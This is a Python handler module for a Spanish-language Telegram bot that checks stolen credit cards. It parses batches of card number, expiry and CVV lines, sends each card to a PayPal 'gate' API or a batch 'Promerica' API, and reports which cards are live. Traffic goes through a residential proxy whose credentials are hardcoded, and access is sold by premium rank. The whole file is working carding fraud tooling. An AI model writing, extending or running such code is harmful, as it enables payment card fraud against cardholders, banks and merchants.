# handlers/gates.py
import asyncio
from handlers.card_tools import gen_logic
import httpx
import time
from pyrogram import filters
from telegram import Update
from telegram.ext import ContextTypes
from config import GATES_STATUS, PP_API_URL, API_URL
from database import get_rango
from utils import extraer_datos_dict
from engines.bins_engine import get_bin_info
from database import antispam_db  # Importamos el diccionario
from gates.payflow1 import ProphecyChecker
from database import check_antispam
# Definición del Job para la cola
from dataclasses import dataclass


import random



PROXIESPWF = ["http://b7e37b644dc5b6cb:VYdXQ67KAtfPgacU@res.proxy-seller.com:10000"]

OWNER_ID = 5651880136
ADMINS = [5133617831]










@dataclass
class Job:
    chat_id: int
    user_name: str
    data_map: dict

QUEUE = asyncio.Queue()



async def process_gate(u: Update, c: ContextTypes.DEFAULT_TYPE):


    user_id = u.effective_user.id
    
    # Una sola línea para el antispam
    puedo_pasar, espera = check_antispam(user_id, OWNER_ID, ADMINS)
    
    if not puedo_pasar:
        return await u.message.reply_text(
            f"<b>⚠️ ANTISPAM</b>\n\nDebes esperar <b>{espera}s</b>.",
            parse_mode="HTML"
        )

    # 1. Si el mensaje NO tiene nada después del comando:
    cmd = u.message.text.split()[0][1:].lower()
    if len(u.message.text.split()) == 1 and not u.message.reply_to_message:
        ayuda = {
        "gt": (
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
            "<b>[ Gate PROMERICA ]</b>\n\n"
            "<b>Uso ></b> <code>/gt cc|mes|año|cvv</code>\n\n"
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>"
        ),
        "pp": (
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
            "<b>[ Gate PAYPAL ]</b>\n\n"
            "<b>Uso ></b> <code>/pp cc|mes|año|cvv</code>\n\n"
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>"
        )
    }
        return await u.message.reply_text(ayuda.get(cmd, "🛠 Uso: `/comando lista`"), parse_mode='HTML')

    # 2. Si tiene texto, sigue con la lógica normal...
    user_id = u.effective_user.id
    if get_rango(user_id) < 1:
        return await u.message.reply_text("❌ Sin Acceso Premium.")
    
     
    
    if cmd in GATES_STATUS and not GATES_STATUS.get(cmd, True): 
        return await u.message.reply_text(f"❌ Gate {cmd.upper()} actualmente en mantenimiento.")
    
    raw_txt = u.message.reply_to_message.text if u.message.reply_to_message else u.message.text
    data_map = extraer_datos_dict(raw_txt)
    
    if not data_map: 
        return await u.message.reply_text("❌ No encontré tarjetas válidas en el texto.")
    

    pizarra = None


    if cmd == "pp":
        pizarra = await u.message.reply_text(
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        "<b>[ Gateway > PayPal ]</b>\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n⏳"
        " <i>Iniciando Check...</i>", 
        parse_mode="HTML")

    resultado_total = ""
    
    async with httpx.AsyncClient(timeout=125) as client:
        cards = list(data_map.values())[:25]
        
        for i, card in enumerate(cards, 1):
            try:
                partes = card.split('|')
                if len(partes) < 4: continue
                cc, mm, aa, cvv = partes[0], partes[1], partes[2], partes[3]
                
                r = await client.get(PP_API_URL, params={"cc": cc, "mm": mm, "aa": aa, "cvv": cvv})
                res_json = r.json()
                
                # Definir Status
                st_api = res_json.get('status')
                if st_api == "approved": st = "Approved ✅"
                elif st_api == "cardCvv": st = "CCN ✅"
                else: st = "Dead ❌"
                
                msg_resp = res_json.get('msg', 'N/A')
                username = u.effective_user.username or u.effective_user.first_name

                # CREAMOS EL CUADRO INDIVIDUAL PARA ESTA TARJETA
                cuadro_card = (
                    "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                    "<b>[ Gateway > PayPal ]</b>\n"
                    "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n\n"
                    f"<b>CC ></b> <code>{card}</code>\n"
                    f"<b>Status ></b> {st}\n"
                    f"<b>Response ></b> {msg_resp}\n\n"
                    "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                    f"<b>[PayPal Gate] > Chk By: @{username}</b>\n\n" # El \n\n es para separar del siguiente cuadro
                )

                # Lo sumamos al total
                resultado_total += cuadro_card

                # Editamos el mensaje con todos los cuadros acumulados
                try:
                    await pizarra.edit_text(resultado_total, parse_mode="HTML")
                except:
                    # Si el mensaje es demasiado largo para edit_text (límite de Telegram), 
                    # podrías optar por enviar uno nuevo, pero con 10 cuadros suele caber.
                    pass
                
                await pizarra.edit_text(resultado_total, parse_mode="HTML")
                await asyncio.sleep(2.0)
                
            except Exception:
                continue


    # 3. Mensaje Finalizado
    txt = ""
    if pizarra is not None:  # <--- ESTA ES LA CLAVE
        try:
            # Usamos resultado_total porque 'txt' parece estar vacío en tu log
            await pizarra.edit_text(resultado_total + "\n\n✅ <b>Proceso Finalizado</b>", parse_mode="HTML")
        except Exception as e:
            print(f"No se pudo editar el mensaje final: {e}")
    # Delay necesario para evitar FloodWait de Telegram
    await asyncio.sleep(2.0) 

    # Al finalizar podemos dejar el último cuadro o un aviso


    
    if cmd == "gt":
        # Enviamos el mensaje y guardamos la respuesta en una variable
        aviso = await u.message.reply_text("✅ **Promerica Gate:** Añadido a la cola de procesamiento.")
        
        # Añadimos el trabajo a la cola
        await QUEUE.put(Job(u.effective_chat.id, u.effective_user.first_name, data_map))
        
        # Función interna para borrar el mensaje después de 30 segundos
        async def borrar_aviso():
            await asyncio.sleep(30)
            try:
                await aviso.delete()
            except:
                # Por si el usuario borró el chat o el mensaje manualmente antes
                pass
        
        # Lanzamos la tarea de borrado sin bloquear el bot
        asyncio.create_task(borrar_aviso())

# --- AQUÍ ESTABA EL ERROR: Faltaba esta función ---
# handlers/gates.py (Actualiza la función worker_bot al final del archivo)



async def worker_bot(worker_id, app):
    """Procesador ultra rápido con formato original."""
    while True:
        job = await QUEUE.get()
        ids = list(job.data_map.keys())
        inicio = time.time()
        
        try:
            async with httpx.AsyncClient(timeout=1200.0) as client:
                # El parámetro threads: 25 es clave para la velocidad en tu API
                r = await client.post(f"{API_URL}/consultar_lote", json=ids, params={"threads": 25})
                
                if r.status_code == 200:
                    resultados = r.json().get("resultados", [])
                    validas = [i for i in resultados if i.get("tipo") == "valida"]
                    
                    if validas:
                        # Usamos tu encabezado original
                        msg = f"✅ **REPORTE DE VÁLIDAS**\n⏱️ `{round(time.time()-inicio, 2)}s`\n\n"
                        
                        for v in validas:
                            # 1. Recuperamos la CC completa (16 dígitos|MM|AA|CVV)
                            cc_full = job.data_map.get(v['id'], v['id'])
                            
                            # 2. Tu API ya manda el bloque formateado en 'detalle'
                            # Así que solo lo pegamos debajo de la CC
                            info_api = v.get('detalle', 'N/A')
                            
                            msg += f"📝 `{cc_full}`\n"
                            msg += f"{info_api}\n"
                            msg += "━━━━━━━━╰☆╮━━━━━━━━\n\n"
                        
                        await app.bot.send_message(job.chat_id, msg, parse_mode="Markdown")
                    else:
                        # Mensaje de Sin Hits opcional pero útil
                        await app.bot.send_message(job.chat_id, f"❌ **Sin Hits**\n⏱️ `{round(time.time()-inicio, 2)}s`", parse_mode="Markdown")
        except Exception as e:
            print(f"Error en Worker {worker_id}: {e}")
        finally:
            QUEUE.task_done()



async def prophecy_logic(full_cc, u: Update):

    

    cmd = u.message.text.split()[0][1:].lower()
    if cmd in GATES_STATUS and not GATES_STATUS.get(cmd, True): 
        return await u.message.reply_text(f"❌ Gate {cmd.upper()} actualmente en mantenimiento.")
    
    """
    Recibe la CC en formato texto y devuelve el mensaje final
    """
    try:
        # 1. Seleccionar Proxy (si vas a usar)
        proxy = random.choice(PROXIESPWF)
        
        # 2. Instanciar el motor
        checker = ProphecyChecker(full_cc, proxy_url=proxy)
        
        # 3. Ejecutar y retornar resultado
        result = await checker.run()
        return result
        
    except Exception as e:
        return f"❌ Error interno: {str(e)}"